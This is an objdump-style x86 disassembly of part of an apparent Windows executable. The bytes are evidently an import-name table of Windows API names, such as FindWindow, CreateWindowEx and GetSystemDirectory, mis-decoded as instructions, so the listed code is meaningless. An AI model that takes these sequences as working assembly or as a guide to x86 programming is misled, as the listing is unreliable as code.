  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
